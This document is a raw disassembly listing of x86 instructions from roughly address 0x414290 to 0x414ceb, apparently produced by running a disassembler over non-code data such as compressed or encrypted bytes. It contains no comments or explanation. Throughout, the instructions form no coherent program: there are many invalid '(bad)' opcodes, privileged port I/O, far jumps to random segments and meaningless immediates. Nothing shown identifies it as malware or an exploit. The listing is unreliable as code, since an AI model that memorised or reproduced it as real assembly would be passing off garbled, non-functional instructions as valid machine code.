  414290:	add    cl,BYTE PTR [edi+esi*1+0x7c]
  414294:	std    
  414295:	out    dx,eax
  414296:	push   ecx
  414297:	sub    DWORD PTR [esi+0x41bef436],ebp
  41429d:	test   eax,0x637b3ae
  4142a2:	fisubr DWORD PTR [edi]
  4142a4:	sub    al,0x5e
  4142a6:	adc    esi,esi
  4142a8:	ja     0x4142c7
  4142aa:	lahf   
  4142ab:	add    BYTE PTR [edx],dh
  4142ad:	mov    BYTE PTR [ebx-0x63567b53],bl
  4142b3:	pop    esi
  4142b4:	push   ebx
  4142b5:	stos   DWORD PTR es:[edi],eax
  4142b6:	sub    ah,ch
  4142b8:	jnp    0x414310
  4142ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142bb:	leave  
  4142bc:	add    dh,ah
  4142be:	cmp    al,BYTE PTR [edx+ebx*8]
  4142c1:	shl    edi,cl
  4142c3:	mov    eax,0xf5880a56
  4142c8:	adc    al,0x54
  4142ca:	mov    ah,ah
  4142cc:	jne    0x41431b
  4142ce:	push   esi
  4142cf:	pop    ss
  4142d0:	xor    eax,0xa8852ce8
  4142d5:	and    eax,0x2b632646
  4142da:	mov    ah,0x36
  4142dc:	xlat   BYTE PTR ds:[ebx]
  4142dd:	push   ecx
  4142de:	sbb    eax,0xf1ad0f13
  4142e3:	jge    0x41431d
  4142e5:	(bad)  
  4142e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142e7:	fdivr  QWORD PTR [edx+ebx*1-0x19]
  4142eb:	jae    0x414306
  4142ed:	test   BYTE PTR [eax],bl
  4142ef:	push   ebp
  4142f0:	pushf  
  4142f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142f2:	xchg   edx,eax
  4142f3:	add    esp,DWORD PTR [edx+0x4f2d6e2a]
  4142f9:	sub    bh,cl
  4142fb:	add    BYTE PTR [ebx+0x76],al
  4142fe:	push   ecx
  4142ff:	mov    ebx,0x6aaccf30
  414304:	inc    edi
  414305:	xor    al,0x77
  414307:	popa   
  414308:	sub    BYTE PTR [ebp-0x6a],dh
  41430b:	stc    
  41430c:	mov    cl,0x5d
  41430f:	out    dx,al
  414310:	inc    esp
	...
  414371:	add    BYTE PTR [eax],al
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	cmc    
  414381:	sub    bl,BYTE PTR [edx+0xd4ebce]
  414387:	add    BYTE PTR ds:0x53000001,al
  41438d:	(bad)  
  41438e:	fldz   
  414390:	xchg   edx,eax
  414391:	mov    al,cl
  414393:	push   edi
  414394:	jp     0x4143f8
  414396:	fwait
  414397:	scas   al,BYTE PTR es:[edi]
  414398:	lock or al,0x1f
  41439b:	mov    ecx,0xf9a820a3
  4143a0:	lods   eax,DWORD PTR ds:[esi]
  4143a1:	outs   dx,DWORD PTR ds:[esi]
  4143a2:	and    al,0xc5
  4143a4:	jmp    0x558d:0x165e8ef6
  4143ab:	test   BYTE PTR [edx],al
  4143ad:	retf   0xe5cd
  4143b0:	xchg   ebx,eax
  4143b1:	inc    esp
  4143b2:	or     dl,BYTE PTR [ebx+0x5e]
  4143b5:	jge    0x414429
  4143b7:	jge    0x414383
  4143b9:	push   0x3f812a3d
  4143be:	mov    bl,0xb1
  4143c0:	adc    cl,dl
  4143c2:	sti    
  4143c3:	(bad)  
  4143c4:	js     0x4143d4
  4143c6:	mov    DWORD PTR [ecx+0x33cf1afe],ecx
  4143cc:	push   ecx
  4143cd:	daa    
  4143ce:	loope  0x4143b0
  4143d0:	cs ins BYTE PTR es:[edi],dx
  4143d2:	xchg   edi,eax
  4143d3:	jg     0x4143cd
  4143d5:	cmp    eax,0xb962b9eb
  4143da:	pop    eax
  4143db:	mov    esi,fs
  4143dd:	add    BYTE PTR [edx+ebx*8],cl
  4143e0:	(bad)
  4143e3:	std    
  4143e4:	adc    dl,BYTE PTR [edx-0x7f]
  4143e7:	test   DWORD PTR gs:[esi+0x5],esp
  4143eb:	xor    al,0xb1
  4143ed:	push   ebp
  4143ee:	dec    edi
  4143ef:	inc    esi
  4143f0:	cli    
  4143f1:	rcr    BYTE PTR [eax-0x2f],cl
  4143f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143f5:	jecxz  0x4143d0
  4143f7:	sub    eax,0xd04434e4
  4143fc:	mov    ah,0xa8
  4143fe:	add    eax,0xab66ae6a
  414403:	jge    0x414408
  414405:	dec    edi
  414406:	test   al,0x72
  414408:	stos   DWORD PTR es:[edi],eax
  414409:	je     0x4143af
  41440b:	jb     0x4143a9
  41440d:	loopne 0x414446
  41440f:	ja     0x414487
  414411:	sub    edx,ecx
  414413:	xchg   dh,cl
  414415:	sbb    al,0x13
  414417:	jecxz  0x41445e
  414419:	pop    edi
  41441a:	jno    0x4143f2
  41441c:	adc    al,0x19
  41441e:	lds    eax,FWORD PTR ds:0x96a74d07
  414424:	and    eax,0xe33ca7db
  414429:	lods   al,BYTE PTR ds:[esi]
  41442a:	adc    eax,0x659570b2
  41442f:	sbb    ebp,eax
  414431:	cld    
  414432:	fstp   QWORD PTR [edx]
  414434:	push   eax
  414435:	call   0x355749fc
  41443a:	in     eax,dx
  41443b:	arpl   WORD PTR [edx],di
  41443d:	jb     0x41443a
  41443f:	mov    esp,0x1b15ebba
  414444:	push   0x2
  414446:	mov    ?,eax
  414448:	pusha  
  414449:	and    eax,0xf89b38e2
  41444e:	xchg   ecx,eax
  41444f:	adc    bh,dh
  414451:	ins    DWORD PTR es:[edi],dx
  414452:	push   esi
  414453:	mov    edi,0x2c8362f8
  414458:	test   al,0xeb
  41445a:	fmul   QWORD PTR [ecx]
  41445c:	mov    ebp,0xa6ce4b83
  414461:	(bad)  
  414462:	mov    ebp,0xa00b228e
  414467:	arpl   di,dx
  414469:	leave  
  41446a:	ss fs (bad) 
  41446d:	sti    
  41446e:	inc    ebx
  41446f:	test   al,0xe5
  414471:	adc    BYTE PTR [ebp+0xc],ah
  414474:	retf   
  414475:	shl    DWORD PTR [esi],1
  414477:	sbb    dh,dl
  414479:	adc    eax,0x2f24ca38
  41447e:	aas    
  41447f:	mov    esi,0xea07f6e3
  414484:	add    BYTE PTR [esi],cl
  414486:	or     BYTE PTR [edi-0x233b023d],ch
  41448c:	cmp    ebp,DWORD PTR [eax-0x18]
  41448f:	adc    eax,0x73
	...
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x61]
  414501:	mov    al,ds:0xd5f00141
  414506:	add    BYTE PTR [eax],al
  414508:	add    eax,0xc5000001
  41450d:	rol    DWORD PTR [edi],cl
  41450f:	inc    eax
  414510:	outs   dx,DWORD PTR fs:[esi]
  414512:	push   ebx
  414513:	mov    ecx,0x3d55ffed
  414518:	mov    bh,0xdb
  41451a:	ror    DWORD PTR [esi+0x4e46085c],1
  414520:	hlt    
  414521:	stc    
  414522:	mov    cl,0xb5
  414524:	icebp  
  414525:	pop    esp
  414526:	les    edx,FWORD PTR [edx+0x9]
  414529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41452a:	dec    edx
  41452b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41452c:	jmp    0xb4aa:0x71a26ce3
  414533:	loopne 0x4145b1
  414535:	lock sub bl,BYTE PTR ds:0xd9218fd2
  41453c:	out    0xcc,al
  41453e:	icebp  
  41453f:	xchg   ebp,eax
  414540:	ficom  WORD PTR [esi-0x50]
  414543:	test   al,0xc6
  414545:	jmp    0xf548:0x19a19c7b
  41454c:	sbb    eax,DWORD PTR [esi-0x56]
  41454f:	add    edi,ebx
  414551:	jmp    FWORD PTR [ecx+0x10]
  414554:	das    
  414555:	stos   BYTE PTR es:[edi],al
  414556:	(bad)  
  414557:	xchg   BYTE PTR [esi],ah
  414559:	js     0x4145d8
  41455b:	pop    es
  41455c:	into   
  41455d:	cmp    DWORD PTR [ecx+0x3c],0x4f
  414561:	test   al,0x45
  414563:	jo     0x414522
  414565:	fcomp  QWORD PTR [ecx+ebx*8]
  414568:	push   ebx
  414569:	mov    dl,0xce
  41456b:	lods   eax,DWORD PTR ds:[esi]
  41456c:	iret   
  41456d:	mov    al,ds:0x76a2acdb
  414572:	mov    dh,0x25
  414574:	jmp    0xc90e:0x1024ee67
  41457b:	dec    eax
  41457c:	or     BYTE PTR [ebx+0x3d10875c],0x12
  414583:	xchg   ebx,eax
  414584:	jg     0x414507
  414586:	and    edi,DWORD PTR [ecx-0x34]
  414589:	pop    ebp
  41458a:	mov    bl,BYTE PTR [edx]
  41458c:	in     eax,0x1f
  41458e:	xchg   DWORD PTR [edi],edi
  414590:	or     DWORD PTR [esi+0x36f04deb],ebp
  414596:	dec    edx
  414597:	jmp    0x6d13:0x32dd9cf8
  41459e:	addr16 jo 0x4145fd
  4145a1:	frstor [ebp+0x51f6be1d]
  4145a7:	jl     0x414615
  4145a9:	cmp    al,0xfe
  4145ab:	in     al,0xa1
  4145ad:	mov    ebp,0xb68cdf06
  4145b2:	(bad)  
  4145b3:	pop    edx
  4145b4:	dec    eax
  4145b5:	(bad)  
  4145b7:	frstor [esi-0x3b0cff87]
  4145bd:	(bad)  
  4145be:	sub    bh,cl
  4145c0:	or     eax,0xaf55b472
  4145c5:	cs mov esi,0xf7b76b70
  4145cb:	dec    edx
  4145cc:	push   0x2c2bc9b6
  4145d1:	popa   
  4145d2:	(bad)  
  4145d3:	mov    bl,0x7a
  4145d5:	xchg   edx,eax
  4145d6:	xlat   BYTE PTR ds:[ebx]
  4145d7:	mov    bh,0xc
  4145d9:	repz pop ebx
  4145db:	jno    0x4145f9
  4145dd:	fld    QWORD PTR [edx+0x5aaa3392]
  4145e3:	outs   dx,DWORD PTR ds:[esi]
  4145e4:	lahf   
  4145e5:	test   BYTE PTR [esi-0x6b],bl
  4145e8:	icebp  
  4145e9:	outs   dx,BYTE PTR ds:[si]
  4145eb:	cbw    
  4145ed:	sbb    DWORD PTR [eax],ecx
  4145ef:	xchg   edx,eax
  4145f0:	sahf   
  4145f1:	iret   
  4145f2:	pop    ebp
  4145f3:	xchg   BYTE PTR [ebx],al
  4145f5:	mov    ebx,0xc4846236
  4145fa:	inc    eax
  4145fb:	mov    al,0x84
  4145fd:	popa   
  4145fe:	lahf   
  4145ff:	es inc ebx
  414601:	das    
  414602:	sbb    al,0x2c
  414604:	inc    esp
  414605:	and    eax,0x5407bc51
  41460a:	adc    eax,0x3a176349
  41460f:	xchg   ecx,eax
  414610:	stc    
	...
  414671:	add    BYTE PTR [eax],al
  414673:	add    BYTE PTR [edi+0x5e],bh
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xb7
  414681:	pusha  
  414682:	mov    ch,0x97
  414684:	cmc    
  414685:	(bad)  
  414686:	add    BYTE PTR [eax],al
  414688:	add    eax,0xd1000001
  41468d:	mov    cl,0x14
  41468f:	pop    esi
  414690:	xchg   edx,eax
  414691:	cmp    al,0x7
  414693:	ss cs pop ds
  414696:	sbb    DWORD PTR [ebx+0x6a9f67ca],edi
  41469c:	call   0x106e68e0
  4146a1:	adc    ch,BYTE PTR [ecx]
  4146a3:	in     al,0xac
  4146a5:	sbb    dh,BYTE PTR [eax-0x1d]
  4146a8:	fcomp  DWORD PTR [ecx+0x65b22823]
  4146ae:	mov    edi,0x99420d01
  4146b3:	pop    ebx
  4146b4:	call   DWORD PTR cs:[eax-0x1f]
  4146b8:	sbb    eax,0x9d695144
  4146bd:	popf   
  4146be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146bf:	test   BYTE PTR [eax-0x55f0e061],0x13
  4146c6:	loop   0x4146c1
  4146c8:	cld    
  4146c9:	pop    ebx
  4146ca:	out    0x31,eax
  4146cc:	sbb    DWORD PTR [eax+0x24],ecx
  4146cf:	test   al,dl
  4146d1:	popa   
  4146d2:	mov    WORD PTR [ecx-0x69a07c0c],?
  4146d8:	mov    ecx,0x42f7f710
  4146dd:	(bad)  
  4146de:	jae    0x4146b6
  4146e0:	repnz ins DWORD PTR es:[edi],dx
  4146e2:	mov    dl,0x74
  4146e4:	or     BYTE PTR [edi+0x6a4a4550],dh
  4146ea:	mov    eax,0xd3d83ff5
  4146ef:	fmul   DWORD PTR [ebx-0xbb6ac33]
  4146f5:	sub    al,0xd8
  4146f7:	cmp    DWORD PTR [ecx-0x73d2d692],0xffffffd8
  4146fe:	and    BYTE PTR [esi+ebp*2-0x57],cl
  414702:	lods   eax,DWORD PTR ds:[esi]
  414703:	test   BYTE PTR [edx-0x2a],bh
  414706:	or     dh,BYTE PTR [edx]
  414708:	loop   0x4146b0
  41470a:	xchg   edx,eax
  41470b:	adc    eax,0x2b71f0a2
  414710:	mov    ds:0x370d124a,al
  414715:	xor    eax,0x59507768
  41471a:	out    0xe,al
  41471c:	mov    esi,0x573252f6
  414721:	cmp    BYTE PTR ds:0xb4fd49b7,al
  414727:	into   
  414728:	mov    WORD PTR [ecx+0x500b45a3],ss
  41472e:	push   0xc332f0f4
  414733:	test   DWORD PTR [ebp+0x2e],edi
  414736:	les    ebx,FWORD PTR [esi-0x3fa21325]
  41473c:	cmp    DWORD PTR [eax],ecx
  41473e:	jle    0x414706
  414740:	test   DWORD PTR [eax],esi
  414742:	or     al,0x24
  414744:	pop    ebp
  414745:	(bad)  
  414746:	mov    eax,0x933e961e
  41474b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41474c:	xchg   ecx,eax
  41474d:	push   DWORD PTR [edx]
  41474f:	ficomp WORD PTR [ecx]
  414751:	jno    0x4146fa
  414753:	add    edx,edi
  414755:	or     al,0x86
  414757:	das    
  414758:	rcr    bh,0x56
  41475b:	jmp    0x414704
  41475d:	out    dx,al
  41475e:	mov    BYTE PTR [edx-0x51],al
  414761:	mov    dl,0x3f
  414763:	sbb    al,0x1d
  414765:	adc    cl,0xa5
  414768:	std    
  414769:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41476b:	and    BYTE PTR [ebp+0x16ed1eef],bh
  414771:	pop    ebx
  414772:	jno    0x4146f7
  414774:	pop    esp
  414775:	or     al,0xcf
  414777:	jecxz  0x414791
  414779:	mov    eax,ds:0x9052eea7
  41477e:	inc    ecx
  41477f:	xchg   BYTE PTR [ebp+0x75],ah
  414782:	push   eax
  414783:	fwait
  414784:	aad    0x38
  414786:	fsub   QWORD PTR [ebp+edx*8-0x19b4fa33]
  41478d:	xchg   bh,ch
  41478f:	add    BYTE PTR ds:0x0,dh
	...
  4147f1:	add    BYTE PTR [eax],al
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0xbde04a18
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0x9b000001
  41480d:	mov    fs,WORD PTR [edi]
  41480f:	sar    BYTE PTR [edx],0xdb
  414812:	leave  
  414813:	pop    esp
  414814:	jl     0x4147ff
  414816:	into   
  414817:	push   ecx
  414818:	mov    WORD PTR [ecx-0x4e],es
  41481b:	and    eax,0x2e488cc
  414820:	xor    esp,ecx
  414822:	add    al,0x5
  414824:	mov    ebx,0xa8ad2af5
  414829:	push   edi
  41482a:	lds    esp,FWORD PTR [ebp-0x4593fc86]
  414830:	aaa    
  414831:	sub    dh,BYTE PTR [edx]
  414833:	in     al,0xb2
  414835:	xchg   DWORD PTR ds:0xcc5fc08a,ebx
  41483b:	lds    edi,FWORD PTR [esi+eax*2-0x4cb2842c]
  414842:	and    al,0xcb
  414844:	ins    BYTE PTR es:[edi],dx
  414845:	push   cs
  414846:	add    eax,0x90893035
  41484b:	sub    DWORD PTR [edi+0x7],eax
  41484e:	nop
  41484f:	adc    esi,edi
  414851:	adc    eax,0xd15bdced
  414856:	rcl    esp,cl
  414858:	xchg   ebp,eax
  414859:	fxch   st(6)
  41485b:	enter  0x430a,0xfe
  41485f:	std    
  414860:	lea    edi,[ebx]
  414862:	pop    es
  414863:	xor    DWORD PTR [esi+0x20d5775a],0x19c6b5dd
  41486d:	pusha  
  41486e:	adc    edx,DWORD PTR [ecx]
  414870:	mov    ebp,DWORD PTR [ebx-0x3f]
  414873:	pop    edi
  414874:	cmc    
  414875:	push   0x267bb8df
  41487a:	out    dx,eax
  41487b:	loopne 0x4148d1
  41487d:	inc    ebp
  41487e:	fld    TBYTE PTR [edi*4-0x2fbb9324]
  414885:	das    
  414886:	jg     0x4148c1
  414888:	pop    edi
  414889:	lods   eax,DWORD PTR ds:[esi]
  41488a:	mov    bh,0xbd
  41488c:	mov    edi,DWORD PTR ds:[ebx+0x7e713534]
  414893:	inc    eax
  414894:	push   ds
  414895:	add    bh,BYTE PTR [ebp-0x16]
  414898:	sub    ebx,DWORD PTR [ecx]
  41489a:	xchg   edi,eax
  41489b:	xor    al,0xab
  41489d:	test   eax,0xc79bb98a
  4148a2:	mov    ah,0xe9
  4148a4:	adc    al,0x28
  4148a6:	sub    eax,DWORD PTR [ebx-0x10d43e41]
  4148ac:	in     al,dx
  4148ad:	cmp    edi,ecx
  4148af:	push   es
  4148b0:	popa   
  4148b1:	mov    dl,0x7e
  4148b3:	mov    al,ds:0xf64eebfb
  4148b8:	sbb    BYTE PTR [ecx+0x5bf17f99],cl
  4148be:	and    DWORD PTR [edx],edi
  4148c0:	stc    
  4148c1:	adc    ebx,DWORD PTR [edi-0x670f4e3]
  4148c7:	cmp    DWORD PTR [ebp+0xe64415],esp
  4148cd:	out    0xc,al
  4148cf:	mov    es,WORD PTR [ebp+0x62]
  4148d2:	ret    
  4148d3:	xchg   esp,eax
  4148d4:	push   cs
  4148d5:	mov    esi,edx
  4148d7:	aas    
  4148d8:	fisttp WORD PTR [esi]
  4148da:	jnp    0x4148a3
  4148dc:	loop   0x414918
  4148de:	mov    eax,0x429ec95f
  4148e3:	xchg   edx,eax
  4148e4:	adc    al,0xe2
  4148e6:	out    0xcf,eax
  4148e8:	or     eax,0xcf82dde
  4148ed:	(bad)  [edi+0x1]
  4148f0:	pop    edi
  4148f1:	mov    dh,0x2a
  4148f3:	pop    eax
  4148f4:	repnz in al,dx
  4148f6:	out    0x3e,eax
  4148f8:	dec    esp
  4148f9:	ds mov dl,0xf6
  4148fc:	cmp    DWORD PTR [esi-0xe],ebp
  4148ff:	rol    DWORD PTR [esi+0x3653bf13],1
  414905:	clc    
  414906:	dec    eax
  414907:	pushf  
  414908:	jg     0x41496b
  41490a:	and    al,0x9f
  41490c:	mov    edx,0xe34b693e
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	stos   BYTE PTR es:[edi],al
  414981:	adc    dh,BYTE PTR ds:0xd8fffe
  414987:	add    BYTE PTR ds:0x2d000001,al
  41498d:	ins    DWORD PTR es:[edi],dx
  41498e:	dec    ebx
  41498f:	je     0x41498e
  414991:	es push eax
  414993:	jp     0x4149c5
  414995:	data16 and BYTE PTR [eax+0x60d02f9b],bh
  41499c:	add    esi,DWORD PTR [ebp+0x6eceb076]
  4149a2:	pop    edx
  4149a3:	mov    eax,0x8d19bb5e
  4149a8:	ficom  DWORD PTR [ecx-0x14f9a2f8]
  4149ae:	mul    BYTE PTR [edi]
  4149b0:	push   ecx
  4149b1:	or     edx,DWORD PTR [edi-0x5d]
  4149b4:	dec    DWORD PTR [eax-0xf]
  4149b7:	cwde   
  4149b8:	xchg   ebp,eax
  4149b9:	dec    edx
  4149ba:	jmp    0x414a32
  4149bc:	test   DWORD PTR [edx],edi
  4149be:	sbb    eax,0xf42726da
  4149c3:	inc    edx
  4149c4:	(bad)  
  4149c5:	jb     0x4149d9
  4149c7:	mov    al,0xa3
  4149c9:	stos   BYTE PTR es:[edi],al
  4149ca:	(bad)  [ecx+0x238bfd59]
  4149d0:	push   cs
  4149d1:	mov    WORD PTR [edi],gs
  4149d3:	push   es
  4149d4:	stos   DWORD PTR es:[edi],eax
  4149d5:	xlat   BYTE PTR ds:[ebx]
  4149d6:	scas   al,BYTE PTR es:[edi]
  4149d7:	enter  0x3d5f,0x21
  4149db:	(bad)  
  4149dc:	sbb    bh,BYTE PTR [ebx+0x72dbf529]
  4149e2:	jle    0x4149be
  4149e4:	loopne 0x414a4f
  4149e6:	push   ebp
  4149e7:	loope  0x414983
  4149e9:	jo     0x41499d
  4149eb:	hlt    
  4149ec:	mov    ecx,0xe201baf2
  4149f1:	push   0xcfb68dce
  4149f6:	stos   BYTE PTR es:[edi],al
  4149f7:	or     DWORD PTR [ebx-0x30],ecx
  4149fa:	jl     0x414a32
  4149fc:	inc    esi
  4149fd:	fs int 0x94
  414a00:	pusha  
  414a01:	loopne 0x4149d1
  414a03:	and    BYTE PTR [ecx],ah
  414a05:	sbb    dl,BYTE PTR [esp+esi*4-0x4d7d769e]
  414a0c:	ja     0x4149e1
  414a0e:	cmp    esi,DWORD PTR [edx]
  414a10:	in     al,0xdf
  414a12:	mov    esp,0x4d106711
  414a17:	sub    edx,esp
  414a19:	je     0x4149bc
  414a1b:	push   es
  414a1c:	(bad)  
  414a1d:	jo     0x4149ac
  414a1f:	iret   
  414a20:	mov    edx,0x9d2c968d
  414a25:	push   ebp
  414a26:	fild   WORD PTR [ecx-0x258f66e3]
  414a2c:	mov    edi,0x173799d4
  414a31:	or     DWORD PTR [ebx],ebp
  414a33:	jae    0x414a00
  414a35:	and    BYTE PTR [eax],ah
  414a37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a38:	pop    esp
  414a39:	retf   0xe98f
  414a3c:	ret    0xcdf2
  414a3f:	inc    DWORD PTR [ebp-0x31f4677d]
  414a45:	add    ebp,edx
  414a47:	xor    bl,bh
  414a49:	cdq    
  414a4a:	cmp    eax,0x845f77
  414a4f:	(bad)  [ecx*2-0xb30277b]
  414a56:	les    esi,FWORD PTR [esi+0x1a]
  414a59:	cld    
  414a5a:	or     DWORD PTR [edx+edx*1-0x396c1632],edx
  414a61:	fwait
  414a62:	mov    eax,ds:0x1ab73d9d
  414a67:	not    DWORD PTR [edx+0x34]
  414a6a:	test   DWORD PTR [edx-0x58],0xde843502
  414a71:	cmp    bh,0x38
  414a74:	pop    es
  414a75:	sub    eax,0xc70d335a
  414a7a:	push   ebx
  414a7b:	inc    ebp
  414a7c:	inc    dl
  414a7e:	adc    DWORD PTR [edi],ebx
  414a80:	mov    ah,0xd8
  414a82:	aaa    
  414a83:	neg    DWORD PTR [edi]
  414a85:	pop    ds
  414a86:	and    al,0x5e
  414a88:	test   eax,0x15b89c8f
  414a8d:	fisub  WORD PTR [edx+0x33]
  414a90:	sbb    al,0x0
	...
  414af2:	add    BYTE PTR [eax],al
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx+0x386e63d9]
  414b02:	and    al,0x32
  414b04:	add    al,0xda
  414b06:	add    BYTE PTR [eax],al
  414b08:	add    eax,0x5a000001
  414b0d:	(bad)  
  414b0e:	sbb    eax,0x24fa5a22
  414b13:	xchg   esp,eax
  414b14:	sbb    eax,0x87fd2e3
  414b19:	jmp    0x414b1e
  414b1b:	jmp    0x6513:0xf9780c35
  414b22:	push   ds
  414b23:	fmul   QWORD PTR ds:0xe467168f
  414b29:	jb     0x414ade
  414b2b:	lahf   
  414b2c:	push   ebp
  414b2d:	fpatan 
  414b2f:	mov    cl,BYTE PTR [edi+ebp*1+0xf]
  414b33:	loope  0x414b48
  414b35:	mov    dh,dl
  414b37:	sbb    eax,0x7a7fd423
  414b3c:	das    
  414b3d:	inc    eax
  414b3e:	or     bl,BYTE PTR [edi+0x19a9b1d6]
  414b44:	ss into 
  414b46:	jge    0x414b2c
  414b48:	pop    ebx
  414b49:	aaa    
  414b4a:	xor    eax,0x579a5bf8
  414b4f:	jp     0x414b04
  414b51:	add    bh,0x5c
  414b54:	pop    ebx
  414b55:	mov    esi,0x785f50b3
  414b5a:	xor    BYTE PTR [ebp+0x44f2c33b],al
  414b60:	and    ecx,edi
  414b62:	jp     0x414b75
  414b64:	sub    DWORD PTR [edi+0x19],edx
  414b67:	daa    
  414b68:	in     eax,0x1c
  414b6a:	add    ah,BYTE PTR [esi]
  414b6c:	xlat   BYTE PTR ds:[ebx]
  414b6d:	pop    es
  414b6e:	sbb    BYTE PTR [ebx-0x333dc0ce],dl
  414b74:	ins    DWORD PTR es:[edi],dx
  414b75:	pushf  
  414b76:	xchg   ebp,eax
  414b77:	call   0x89a5f0e0
  414b7c:	imul   ebp,DWORD PTR [eax-0x2f],0xffffff8b
  414b80:	pop    es
  414b81:	daa    
  414b82:	sbb    al,0xf4
  414b84:	xchg   edi,eax
  414b85:	lods   eax,DWORD PTR ds:[esi]
  414b86:	hlt    
  414b87:	dec    ebx
  414b88:	inc    edi
  414b89:	jnp    0x414b32
  414b8b:	add    DWORD PTR [ebp+0x5d0161fa],esp
  414b91:	fsub   QWORD PTR [ebx-0x4ffd00f4]
  414b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b98:	repnz retf 
  414b9a:	rol    ebx,1
  414b9c:	pop    edi
  414b9d:	inc    ecx
  414b9e:	pop    ecx
  414b9f:	arpl   di,dx
  414ba1:	sub    eax,0x50ef3d8c
  414ba6:	ror    DWORD PTR fs:[esi+0x631652a0],cl
  414bad:	nop
  414bae:	lahf   
  414baf:	pop    DWORD PTR [edx+0x57]
  414bb2:	(bad)  
  414bb3:	fdivr  QWORD PTR [eax+0x1c0ef483]
  414bb9:	es pop es
  414bbb:	scas   eax,DWORD PTR es:[edi]
  414bbc:	push   edi
  414bbd:	pushf  
  414bbe:	stos   DWORD PTR es:[edi],eax
  414bbf:	scas   eax,DWORD PTR es:[edi]
  414bc0:	loope  0x414bd2
  414bc2:	(bad)  
  414bc3:	pop    ebp
  414bc4:	cmp    al,0xb8
  414bc6:	push   esp
  414bc7:	adc    ah,bl
  414bc9:	mov    WORD PTR [edx+0x34],?
  414bcc:	adc    edx,DWORD PTR [edx-0x6bb0525]
  414bd2:	outs   dx,BYTE PTR ds:[esi]
  414bd3:	cdq    
  414bd4:	xchg   esi,eax
  414bd5:	mov    dh,0xa6
  414bd7:	sub    dl,BYTE PTR [eax]
  414bd9:	jmp    0x414c2b
  414bdb:	(bad)  
  414bdc:	imul   esi,DWORD PTR [ebp+eax*4+0x76],0x2b
  414be1:	scas   al,BYTE PTR es:[edi]
  414be2:	push   esp
  414be3:	pop    edx
  414be4:	call   0xdf0de04c
  414be9:	dec    ebp
  414bea:	mov    ds:0x4fcc7d1a,al
  414bef:	jecxz  0x414bc1
  414bf1:	dec    esp
  414bf2:	or     esp,DWORD PTR [eax+edx*8-0x1d]
  414bf6:	and    al,0x67
  414bf8:	add    BYTE PTR [esp+edx*2-0x60],0x92
  414bfd:	or     ah,dl
  414bff:	mov    esp,0x45c826ff
  414c04:	aad    0x6
  414c06:	sbb    ecx,DWORD PTR [ebp+0x23]
  414c09:	(bad)  
  414c0a:	jmp    0x4b01ad34
  414c0f:	xor    al,0x7d
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	cs adc ebx,esp
  414c81:	js     0x414ce0
  414c83:	cmp    cl,BYTE PTR [ecx]
  414c85:	fild   DWORD PTR [eax]
  414c87:	add    BYTE PTR ds:0xa8000001,al
  414c8d:	daa    
  414c8e:	repnz shr ah,cl
  414c91:	cmp    DWORD PTR [edi+ecx*2],esp
  414c94:	mov    WORD PTR ds:0x59c55778,gs
  414c9a:	loop   0x414ca4
  414c9c:	repz or ecx,ecx
  414c9f:	pop    eax
  414ca0:	cmp    bl,BYTE PTR [edx+ecx*4-0x7a]
  414ca4:	push   esi
  414ca5:	test   ecx,0xa877940c
  414cab:	repnz imul esi,DWORD PTR [esi+0x6377088f],0xfffffff9
  414cb3:	sub    DWORD PTR [ecx],0x2a8178
  414cb9:	xor    DWORD PTR [eax+ebp*8+0x19],edx
  414cbd:	ret    
  414cbe:	ret    0x99b5
  414cc1:	add    DWORD PTR [ebx],esp
  414cc3:	push   ebp
  414cc4:	pop    esp
  414cc5:	adc    al,0xc0
  414cc7:	dec    edi
  414cc8:	push   esp
  414cc9:	push   eax
  414cca:	in     al,0xe3
  414ccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ccd:	mov    ch,0x65
  414ccf:	out    dx,al
  414cd0:	and    dl,bh
  414cd2:	mov    ah,BYTE PTR [ecx+edx*1]
  414cd5:	push   ebx
  414cd6:	std    
  414cd7:	add    al,al
  414cd9:	rol    DWORD PTR [edi],0xca
  414cdc:	loope  0x414d5c
  414cde:	enter  0xef7c,0xc8
  414ce2:	sbb    dh,BYTE PTR [ecx]
  414ce4:	push   0xcc943d0b
  414ce9:	sub    bh,dh
  414ceb:	inc    ebp
